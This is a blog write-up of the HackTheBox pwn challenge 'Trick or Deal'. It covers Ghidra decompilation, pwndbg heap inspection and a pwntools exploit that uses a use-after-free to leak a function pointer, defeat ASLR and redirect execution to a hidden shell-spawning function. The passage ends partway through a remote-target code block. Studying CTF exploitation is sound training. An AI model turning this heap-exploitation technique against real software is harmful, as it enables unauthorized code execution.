---
title: "Writeup: Trick or Deal"
date: 2023-05-05T19:54:04+02:00
draft: false
---

# Introduction

**Trick or Deal** is a *Medium* retired [hackthebox](https://app.hackthebox.com/challenges/trick-or-deal) ***pwn*** challenge. It has 97 solves and no writeup at the publication of this blog post.

This binary has a secret function `unlock_storage()`, and a **Use-After-Free** vulnerability.

To exploit this binary, I will use [pwndbg](https://github.com/pwndbg/pwndbg) and [pwntools](https://docs.pwntools.com/en/stable/).  
[Ghidra](https://ghidra-sre.org/) was also used for the analysis. The snippets of **C** code were obtained using the *Ghidra decompiler*.

# Analysis

The binary gives us a **menu** with **5 actions**. Each action will call a function.

```
-_-_-_-_-_-_-_-_-_-_-_-_-
|                       |
|  [1] See the Weaponry |
|  [2] Buy Weapons      |
|  [3] Make an Offer    |
|  [4] Try to Steal     |
|  [5] Leave            |
|                       |
-_-_-_-_-_-_-_-_-_-_-_-_-

[*] What do you want to do?
```

Let's investigate.

### Not interesting

The *5th action* simply quit the binary.

The *2nd action* `[2] Buy Weapons` call the function **`buy()`** and has **no interest** for us.  
It simply output back our input.

```C
void buy(void)

{
  char buf [72];
  
  fwrite("\n[*] What do you want!!? ",1,25,stdout);
  read(0,buf,71);
  fprintf(stdout,"\n[!] No!, I can\'t give you %s\n",buf);
  fflush(stdout);
  fwrite("[!] Get out of here!\n",1,21,stdout);
  
  return;
}
```

### The Heap

The *actions 1, 3 and 4* are more interesting. But first, let's take a look at the **heap**.

We run the binary in **gdb** (with the [pwndbg](https://github.com/pwndbg/pwndbg) extension).  
Simply **break** with `Ctrl + C` and use the **`vis_heap_chunks`** command to explore the **heap**.



{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ gdb -q ./trick_or_deal

<font color="#F92672"><b>pwndbg&gt; </b></font>r
Starting program: <font color="#A6E22E">/home/hackthebox/challenge/pwn/Trick_or_Deal/trick_or_deal</font> 
💵 <font color="#AE81FF"><b> Welcome to the Intergalactic Weapon Black Market 💵</b></font>

<font color="#A6E22E"><b>Loading the latest weaponry . . .</b></font>

<font color="#AE81FF"><b>-_-_-_-_-_-_-_-_-_-_-_-_-</b></font>
<font color="#AE81FF"><b>|                       |</b></font>
<font color="#AE81FF"><b>|  [1] See the Weaponry |</b></font>
<font color="#AE81FF"><b>|  [2] Buy Weapons      |</b></font>
<font color="#AE81FF"><b>|  [3] Make an Offer    |</b></font>
<font color="#AE81FF"><b>|  [4] Try to Steal     |</b></font>
<font color="#AE81FF"><b>|  [5] Leave            |</b></font>
<font color="#AE81FF"><b>|                       |</b></font>
<font color="#AE81FF"><b>-_-_-_-_-_-_-_-_-_-_-_-_-</b></font>

<font color="#AE81FF"><b>[*] What do you want to do? ^C</b></font>
<font color="#AE81FF"><b>Program received signal SIGINT, Interrupt.</b></font>
<font color="#66D9EF"><b>0x00007ffff7ee3002</b></font> in <font color="#F4BF75">read</font> () from <font color="#A6E22E">./glibc/libc.so.6</font>

<font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 

0x555555603000  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000291</font> <font color="#A1EFE4">................</font>
0x555555603010  <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">................</font>
[...]

0x555555603290  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000000061</font> <font color="#AE81FF">........a.......</font>
0x5555556032a0  <font color="#AE81FF">0x67694c206568540a</font> <font color="#AE81FF">0x0a72656261737468</font> <font color="#AE81FF">.The Lightsaber.</font>
0x5555556032b0  <font color="#AE81FF">0x6e6f53206568540a</font> <font color="#AE81FF">0x7765726353206369</font> <font color="#AE81FF">.The Sonic Screw</font>
0x5555556032c0  <font color="#AE81FF">0x0a0a726576697264</font> <font color="#AE81FF">0x0a73726573616850</font> <font color="#AE81FF">driver..Phasers.</font>
0x5555556032d0  <font color="#AE81FF">0x696f4e206568540a</font> <font color="#AE81FF">0x6b63697243207973</font> <font color="#AE81FF">.The Noisy Crick</font>
0x5555556032e0  <font color="#AE81FF">0x00000000000a7465</font> <font color="#AE81FF">0x0000555555400be6</font> <font color="#AE81FF">et........@UUU..</font>
0x5555556032f0  <font color="#AE81FF">0x0000000000000000</font> <font color="#A6E22E">0x0000000000020d11</font> <font color="#A6E22E">................</font>  &lt;-- Top chunk
</code></pre></div>
{{< /rawhtml >}}


At the **address `0x555555603290`**, we have a **chunk** of size *0x60*.

#### Mixed data and function pointers

The *chunk* is the variable **`storage`** which contain some **data**, and a **pointer** to **`printStorage()`**: `0x555555400be6`.  
We can see that `0x555555603290` is a pointer to `printStorage()` using the **`disassemble`** command.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>disassemble 0x0000555555400be6
Dump of assembler code for function <font color="#F4BF75">printStorage</font>:
   <font color="#66D9EF">0x0000555555400be6</font> &lt;+0&gt;:  <font color="#A6E22E">push</font><font color="#F8F8F2">   </font><font color="#F92672">rbp</font>
   <font color="#66D9EF">0x0000555555400be7</font> &lt;+1&gt;:  <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rbp</font>,<font color="#F92672">rsp</font>
   <font color="#66D9EF">0x0000555555400bea</font> &lt;+4&gt;:  <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rax</font>,<font color="#F92672">QWORD</font><font color="#F8F8F2"> </font><font color="#F92672">PTR</font><font color="#F8F8F2"> </font>[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x20144f</font>]<font color="#F8F8F2">        # 0x555555602040 &lt;storage&gt;</font>
   <font color="#66D9EF">0x0000555555400bf1</font> &lt;+11&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rdx</font>,<font color="#F92672">rax</font>
   <font color="#66D9EF">0x0000555555400bf4</font> &lt;+14&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rax</font>,<font color="#F92672">QWORD</font><font color="#F8F8F2"> </font><font color="#F92672">PTR</font><font color="#F8F8F2"> </font>[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x201425</font>]<font color="#F8F8F2">        # 0x555555602020 &lt;stdout@@GLIBC_2.2.5&gt;</font>
   <font color="#66D9EF">0x0000555555400bfb</font> &lt;+21&gt;: <font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">r8</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x63f</font>]<font color="#F8F8F2">        # 0x555555401241</font>
   <font color="#66D9EF">0x0000555555400c02</font> &lt;+28&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rcx</font>,<font color="#F92672">rdx</font>
   <font color="#66D9EF">0x0000555555400c05</font> &lt;+31&gt;: <font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">rdx</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x67f</font>]<font color="#F8F8F2">        # 0x55555540128b</font>
   <font color="#66D9EF">0x0000555555400c0c</font> &lt;+38&gt;: <font color="#A6E22E">lea</font><font color="#F8F8F2">    </font><font color="#F92672">rsi</font>,[<font color="#F92672">rip</font><font color="#F92672"><u style="text-decoration-style:single">+</u></font><font color="#66D9EF">0x6ad</font>]<font color="#F8F8F2">        # 0x5555554012c0</font>
   <font color="#66D9EF">0x0000555555400c13</font> &lt;+45&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">rdi</font>,<font color="#F92672">rax</font>
   <font color="#66D9EF">0x0000555555400c16</font> &lt;+48&gt;: <font color="#A6E22E">mov</font><font color="#F8F8F2">    </font><font color="#F92672">eax</font>,<font color="#66D9EF">0x0</font>
   <font color="#66D9EF">0x0000555555400c1b</font> &lt;+53&gt;: <font color="#A6E22E">call</font><font color="#F8F8F2">   </font><font color="#66D9EF">0x555555400920</font> &lt;<font color="#F92672">fprintf@plt</font>&gt;
   <font color="#66D9EF">0x0000555555400c20</font> &lt;+58&gt;: <font color="#A6E22E">nop</font>
   <font color="#66D9EF">0x0000555555400c21</font> &lt;+59&gt;: <font color="#A6E22E">pop</font><font color="#F8F8F2">    </font><font color="#F92672">rbp</font>
   <font color="#66D9EF">0x0000555555400c22</font> &lt;+60&gt;: <font color="#A6E22E">ret</font><font color="#F8F8F2">    </font>
End of assembler dump.
</code></pre></div>
{{< /rawhtml >}}

The content of **`storage`** is written by the function **`update_weapons()`**. `update_weapons()` is called by `main` at the start of the program:

```C
void update_weapons(void)

{
  storage = (char *)malloc(0x50);
  strcpy(storage,"\nThe Lightsaber\n\nThe Sonic Screwdriver\n\nPhasers\n\nThe Noisy Cricket\n");
  *(code **)(storage + 0x48) = printStorage;
  return;
}
```

Having functions pointers mixed with data is interesting for us. If we can tamper with a function pointer, it might give us the ability to call other functions.

## Useful functions

### See the data

The *1st action* `[1] See the Weaponry` will call the **pointer** at the **end** of the **chunk** to call **`printStorage()`**.


```C
void printStorage(void)

{
  fprintf(stdout,"\n%sWeapons in stock: \n %s %s","\x1b[1;32m",storage,"\x1b[1;35m");
  return;
}
```

`printStorage()` will output the content of the global variable **`storage`**.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ ./trick_or_deal
💵 <font color="#AE81FF"><b> Welcome to the Intergalactic Weapon Black Market 💵</b></font>
[...]

<font color="#AE81FF"><b>[*] What do you want to do? 1</b></font>

<font color="#A6E22E"><b>Weapons in stock: </b></font>
<font color="#A6E22E"><b> </b></font>
<font color="#A6E22E"><b>The Lightsaber</b></font>

<font color="#A6E22E"><b>The Sonic Screwdriver</b></font>

<font color="#A6E22E"><b>Phasers</b></font>

<font color="#A6E22E"><b>The Noisy Cricket</b></font>
</code></pre></div>
{{< /rawhtml >}}

### Free()

The *4th action* call the function `steal()` that **free** the variable **`storage`**.

```C
void steal(void)

{
  fwrite("\n[*] Sneaks into the storage room wearing a face mask . . . \n",1,0x3d,stdout);
  sleep(2);
  fprintf(stdout,"%s[*] Guard: *Spots you*, Thief! Lockout the storage!\n","\x1b[1;31m");
  free(storage);
  sleep(2);
  fprintf(stdout,"%s[*] You, who didn\'t skip leg-day, escape!%s\n","\x1b[1;32m","\x1b[1;35m");
  return;
}
```

Let's see this in action with *gdb*.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ gdb ./trick_or_deal

<font color="#F92672"><b>pwndbg&gt; </b></font>run
💵 <font color="#AE81FF"><b> Welcome to the Intergalactic Weapon Black Market 💵</b></font>
[...]

<font color="#AE81FF"><b>[*] What do you want to do? 4</b></font>

<font color="#AE81FF"><b>[*] Sneaks into the storage room wearing a face mask . . . </b></font>
<font color="#F92672"><b>[*] Guard: *Spots you*, Thief! Lockout the storage!</b></font>
<font color="#A6E22E"><b>[*] You, who didn&apos;t skip leg-day, escape!</b></font>

<font color="#AE81FF"><b>Program received signal SIGINT, Interrupt.</b></font>
<font color="#66D9EF"><b>0x00007ffff7ee3002</b></font> in <font color="#F4BF75">read</font> () from <font color="#A6E22E">./glibc/libc.so.6</font>

<font color="#F92672"><b>pwndbg&gt; </b></font>heap
<font color="#F4BF75">Allocated chunk</font> | <font color="#F4BF75">PREV_INUSE</font>
Addr: <font color="#66D9EF">0x555555603000</font>
Size: 0x291

<font color="#A6E22E">Free chunk (tcachebins)</font> | <font color="#F4BF75">PREV_INUSE</font>
Addr: <font color="#66D9EF">0x555555603290</font>
Size: 0x61
<font color="#F92672">fd</font>: 0x00

<font color="#F92672">Top chunk</font> | <font color="#F4BF75">PREV_INUSE</font>
Addr: <font color="#66D9EF">0x5555556032f0</font>
Size: 0x20d11

<font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 

0x555555603000  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000291</font> <font color="#A1EFE4">................</font>
0x555555603010  <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000001</font> <font color="#A1EFE4">................</font>
0x555555603020  <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000000</font> <font color="#A1EFE4">................</font>
[...]
0x555555603290  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000000061</font> <font color="#AE81FF">........a.......</font>
0x5555556032a0  <font color="#AE81FF">0x0000000000000000</font> <font color="#AE81FF">0x0000555555603010</font> <font color="#AE81FF">.........0`UUU..</font>  &lt;-- tcachebins[0x60][0/1]
0x5555556032b0  <font color="#AE81FF">0x6e6f53206568540a</font> <font color="#AE81FF">0x7765726353206369</font> <font color="#AE81FF">.The Sonic Screw</font>
0x5555556032c0  <font color="#AE81FF">0x0a0a726576697264</font> <font color="#AE81FF">0x0a73726573616850</font> <font color="#AE81FF">driver..Phasers.</font>
0x5555556032d0  <font color="#AE81FF">0x696f4e206568540a</font> <font color="#AE81FF">0x6b63697243207973</font> <font color="#AE81FF">.The Noisy Crick</font>
0x5555556032e0  <font color="#AE81FF">0x00000000000a7465</font> <font color="#AE81FF">0x0000555555400be6</font> <font color="#AE81FF">et........@UUU..</font>
0x5555556032f0  <font color="#AE81FF">0x0000000000000000</font> <font color="#A6E22E">0x0000000000020d11</font> <font color="#A6E22E">................</font>  &lt;-- Top chu
</pre></code></pre></div>
{{< /rawhtml >}}



### Malloc()

The *3rd action* call the function `make_offer()` that **malloc** an arbitrary sized chunk. And let us write data in this new *chunk*.

```C
void make_offer(void)

{
  char anwser [3];
  size_t size;
  
  size = 0;
  memset(anwser,0,3);
  fwrite("\n[*] Are you sure that you want to make an offer(y/n): ",1,55,stdout);
  read(0,anwser,2);

  if (anwser[0] == 'y') {
    fwrite("\n[*] How long do you want your offer to be? ",1,45,stdout);
    size = read_num();
    offer = malloc(size);

    fwrite("\n[*] What can you offer me? ",1,28,stdout);
    read(0,offer,size);

    fwrite("[!] That\'s not enough!\n",1,23,stdout);
  }

  else {
    fwrite("[!] Don\'t bother me again.\n",1,27,stdout);
  }

  return;
}
```


Again, let's do this in *gdb* and observe the memory with `vis_heap_chunks`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ gdb -q ./trick_or_deal

<font color="#F92672"><b>pwndbg&gt; </b></font>r
Starting program: <font color="#A6E22E">./trick_or_deal</font> 

💵 <font color="#AE81FF"><b> Welcome to the Intergalactic Weapon Black Market 💵</b></font>
[...]

<font color="#AE81FF"><b>[*] What do you want to do? 3</b></font>

<font color="#AE81FF"><b>[*] Are you sure that you want to make an offer(y/n): y</b></font>

<font color="#AE81FF"><b>[*] How long do you want your offer to be? 32</b></font>

<font color="#AE81FF"><b>[*] What can you offer me? YYYYYYYYYYYYYYYY</b></font>
<font color="#AE81FF"><b>[!] That&apos;s not enough!</b></font>

<font color="#AE81FF"><b>^C</b></font>
<font color="#AE81FF"><b>Program received signal SIGINT, Interrupt.</b></font>
<font color="#66D9EF"><b>0x00007ffff7ee3002</b></font> in <font color="#F4BF75">read</font> () from <font color="#A6E22E">./glibc/libc.so.6</font>

<font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 2 0x555555603290

0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
0x5555556032a0  <font color="#A1EFE4">0x67694c206568540a</font> <font color="#A1EFE4">0x0a72656261737468</font> <font color="#A1EFE4">.The Lightsaber.</font>
0x5555556032b0  <font color="#A1EFE4">0x6e6f53206568540a</font> <font color="#A1EFE4">0x7765726353206369</font> <font color="#A1EFE4">.The Sonic Screw</font>
0x5555556032c0  <font color="#A1EFE4">0x0a0a726576697264</font> <font color="#A1EFE4">0x0a73726573616850</font> <font color="#A1EFE4">driver..Phasers.</font>
0x5555556032d0  <font color="#A1EFE4">0x696f4e206568540a</font> <font color="#A1EFE4">0x6b63697243207973</font> <font color="#A1EFE4">.The Noisy Crick</font>
0x5555556032e0  <font color="#A1EFE4">0x00000000000a7465</font> <font color="#A1EFE4">0x0000555555400be6</font> <font color="#A1EFE4">et........@UUU..</font>
0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000000031</font> <font color="#AE81FF">........1.......</font>
0x555555603300  <font color="#AE81FF">0x5959595959595959</font> <font color="#AE81FF">0x5959595959595959</font> <font color="#AE81FF">YYYYYYYYYYYYYYYY</font>
0x555555603310  <font color="#AE81FF">0x000000000000000a</font> <font color="#AE81FF">0x0000000000000000</font> <font color="#AE81FF">................</font>
0x555555603320  <font color="#AE81FF">0x0000000000000000</font> <font color="#A6E22E">0x0000000000020ce1</font> <font color="#A6E22E">................</font>  &lt;-- Top chunk
</code></pre></div>
{{< /rawhtml >}}


### Secret function

The binary has a secret function `unlock_storage()`. We can see below in Ghidra. You can also see it in *rizin* or *radare2* using the `afl` command.

![Functions in Ghidra](/trick_or_deal/trick_or_deal_functions2.png)

Calling this function gives us a **shell**.

```C
void unlock_storage(void)

{
  fprintf(stdout,"\n%s[*] Bruteforcing Storage Access Code . . .%s\n","\x1b[5;32m","\x1b[25;0m");
  sleep(2);
  fprintf(stdout,"\n%s* Storage Door Opened *%s\n","\x1b[1;32m","\x1b[1;0m");
  system("sh");
  return;
}
```

## Recap

The binary has a variable **`storage`** that holds some *ASCII data* and a **pointer** to `printStorage()`. The binary also has a secret function `unlock_storage()` that gives us a shell.

* Action **1** will **follow the pointer** in `storage` to call `printStorage()`. This prints the data of `storage`.
* Action **3** *malloc()* an arbitrary sized chunk, and write data into this new memory.
* Action **4** *free()* the variable `storage`.


>  If you haven't solved the binary yet. Stop here, and try to exploit the binary.


## The Bug

We have a **Use-After-Free** bug, which means that the program does not check if the memory has been free when we call the functions. Here we have a possibility to realloc data of our own, and still use the *action 1* that call the pointer present on the heap.


## The exploit

Our strategy is to **replace** the pointer to `printStorage()` with a pointer to `unlock_storage()`.  

Since the binary is protected with *ASLR*, we first need to **leak** the `printStorage()` pointer. We can then calculate the address of `unlock_storage()` by adding the needed *offset* to our *leaked pointer*.

Fist let's create an exploit skeleton use the `pwn template` command of pwntools.

    $ pwn template trick_or_deal

And let's add a few helper functions, to make or exploit development easier.

```Python
#!/usr/bin/env python3
# coding: utf-8

from pwn import *

# Create a new pane the Tilix terminal emulator when using the GDB option
# context.terminal = ['tilix','--action=session-add-right', '-e']

# Set up pwntools for the correct architecture
exe = context.binary = ELF('trick_or_deal')

# Many built-in settings can be controlled on the command line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes.
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'


# Helper functions

def free():
    io.recvuntil(b'[*] What do you want to do?')
    io.sendline(b'4')

def malloc(size, data):
    io.sendafter(b'[*] What do you want to do?', b'3\n')
    io.sendafter(b'[*] Are you sure that you want to make an offer(y/n): ', b'y\n')
    
    io.sendafter(b'[*] How long do you want your offer to be?', f"{size}".encode())
    io.sendafter(b'[*] What can you offer me? ', data)


io = start()



io.interactive()
```


### Leak address

We free the initial buffer, and we malloc enough data to bridge the pointer we aim to leak. By leaving no space before the variable, it will be printed when we call `printStorage()`.

```Python
io = start()

free()

# We don't overwrite the function pointer so that we can leak it.
payload = 0x48 * b'Y'
malloc(0x58, payload)

# Leak pointer
io.sendlineafter(b'[*] What do you want to do? ', b'1')

leak = u64(io.readline()[:6] + b'\x00\x00')
log.info(f"printStorage leak: {hex(leak)}")

io.interactive()
```

Note that the chunk is of size *0x60*, so we malloc *0x58* as malloc add *8* bytes for chunk metadata.

Initially the heap looked like this :

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 2 0x555555603290 

0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
0x5555556032a0  <font color="#A1EFE4">0x67694c206568540a</font> <font color="#A1EFE4">0x0a72656261737468</font> <font color="#A1EFE4">.The Lightsaber.</font>
0x5555556032b0  <font color="#A1EFE4">0x6e6f53206568540a</font> <font color="#A1EFE4">0x7765726353206369</font> <font color="#A1EFE4">.The Sonic Screw</font>
0x5555556032c0  <font color="#A1EFE4">0x0a0a726576697264</font> <font color="#A1EFE4">0x0a73726573616850</font> <font color="#A1EFE4">driver..Phasers.</font>
0x5555556032d0  <font color="#A1EFE4">0x696f4e206568540a</font> <font color="#A1EFE4">0x6b63697243207973</font> <font color="#A1EFE4">.The Noisy Crick</font>
0x5555556032e0  <font color="#A1EFE4">0x00000000000a7465</font> <font color="#A1EFE4">0x0000555555400be6</font> <font color="#A1EFE4">et........@UUU..</font>
0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000020d11</font> <font color="#AE81FF">................</font>    &lt;-- Top chunk
</code></pre></div>
{{< /rawhtml >}}

We can run our script with debugging options `$ ./xpl.py NOASLR DEBUG GDB`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>vis_heap_chunks 2 0x555555603290 

0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
0x5555556032a0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">YYYYYYYYYYYYYYYY</font>
0x5555556032b0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">YYYYYYYYYYYYYYYY</font>
0x5555556032c0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">YYYYYYYYYYYYYYYY</font>
0x5555556032d0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">YYYYYYYYYYYYYYYY</font>
0x5555556032e0  <font color="#A1EFE4">0x5959595959595959</font> <font color="#A1EFE4">0x0000555555400be6</font> <font color="#A1EFE4">YYYYYYYY..@UUU..</font>
0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000020d11</font> <font color="#AE81FF">................</font> &lt;-- Top chunk
</code></pre></div>
{{< /rawhtml >}}


We have filled the buffer with `'Y'` and there is no  `'\x00'` left that would indicate a *end of file*.
The pointer will be considered as part of the string and will be printed when we call `printStorage()`.


{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">    b&apos;[*] What do you want to do? &apos;
[<font color="#F92672"><b>DEBUG</b></font>] Sent 0x2 bytes:
    b&apos;1\n&apos;
[<font color="#F92672"><b>DEBUG</b></font>] Received 0x17a bytes:
    00000000  <font color="#F92672">0a</font> <font color="#66D9EF">1b</font> 5b 31  3b 33 32 6d  57 65 61 70  6f 6e 73 20  │<font color="#F92672">·</font><font color="#66D9EF">·</font>[1<font color="#66D9EF">│</font>;32m<font color="#66D9EF">│</font>Weap<font color="#66D9EF">│</font>ons │
    00000010  69 6e 20 73  74 6f 63 6b  3a 20 <font color="#F92672">0a</font> 20  59 59 59 59  │in s<font color="#66D9EF">│</font>tock<font color="#66D9EF">│</font>: <font color="#F92672">·</font> <font color="#66D9EF">│</font>YYYY│
    00000020  59 59 59 59  59 59 59 59  59 59 59 59  59 59 59 59  │YYYY<font color="#66D9EF">│</font>YYYY<font color="#66D9EF">│</font>YYYY<font color="#66D9EF">│</font>YYYY│
    *
    00000060  59 59 59 59  <font color="#66D9EF">e6</font> <font color="#66D9EF">0b</font> 40 55  55 55 20 <font color="#66D9EF">1b</font>  5b 31 3b 33  │YYYY<font color="#66D9EF">│··</font>@U<font color="#66D9EF">│</font>UU <font color="#66D9EF">·│</font>[1;3│
    *
[<font color="#66D9EF"><b>*</b></font>] printStorage leak: 0x555555400be6
[<font color="#66D9EF"><b>*</b></font>] Switching to interactive mode
</code></pre></div>
{{< /rawhtml >}}


### Calculate the Offset

First, let's use *gdb* to see the address of each function.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>p printStorage 
$1 = {&lt;text variable, no debug info&gt;} <font color="#66D9EF">0x555555400be6</font> &lt;<font color="#F4BF75">printStorage</font>&gt;
<font color="#F92672"><b>pwndbg&gt; </b></font>p unlock_storage 
$2 = {&lt;text variable, no debug info&gt;} <font color="#66D9EF">0x555555400eff</font> &lt;<font color="#F4BF75">unlock_storage</font>&gt;
</code></pre></div>
{{< /rawhtml >}}


Now, let's calculate the offset between the two functions with *python*.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ python3
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
>>> hex(0x555555400eff - 0x555555400be6)
'0x319'
</code></pre></div>
{{< /rawhtml >}}

Now we just have to add this value to the leaked pointer to calculate the address of `unlock_storage()`.
Let's add this to our exploit script.

```python3
leak = u64(io.readline()[:6] + b'\x00\x00')
log.info(f"printStorage leak: {hex(leak)}")

unlock_storage = leak + 0x319
log.info(f"unlock_storage: {hex(unlock_storage)}")

io.interactive()
```

### Overwrite the function pointer

Now we can overwrite the pointer to `printStorage()` with a pointer to `unlock_storage()`.

Let's *free()* the buffer using our helper function, then fill it with *0x48* chars and overwrite the function pointer.

```Python3
# overwrite printStorage with unlock_storage
free()

payload = b'V' * 0x48 + p64(unlock_storage)
malloc(0x50, payload)
```

Our heap look like this now.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>vis 1 0x555555603290

0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
0x5555556032a0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
0x5555556032b0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
0x5555556032c0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
0x5555556032d0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
0x5555556032e0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x0000555555400eff</font> <font color="#A1EFE4">VVVVVVVV..@UUU..</font>
0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000020d11</font> <font color="#AE81FF">................</font>  &lt;-- Top chun
</code></pre></div>
{{< /rawhtml >}}

### Call `unlock_storage()`

All that's left to do is to call the function pointer, with the first action.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">[*] What do you want to do? <font color="#F92672"><b>$</b></font> 1

<blink><font color="#A6E22E">[*] Bruteforcing Storage Access Code . . .</font></blink>

<font color="#A6E22E"><b>* Storage Door Opened *</b></font>
<font color="#F92672"><b>$</b></font> id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
</code></pre></div>
{{< /rawhtml >}}

Add this ultimate step, and we have a complete exploit.

```python3
io.sendlineafter(b'[*] What do you want to do? ', b'1')

io.interactive()
```

### Remote option

It's nice to have a REMOTE option to target the ctf server. I generally modify the `start()` function of the exploit script with this option.

```python3
def start(argv=[], *a, **kw):
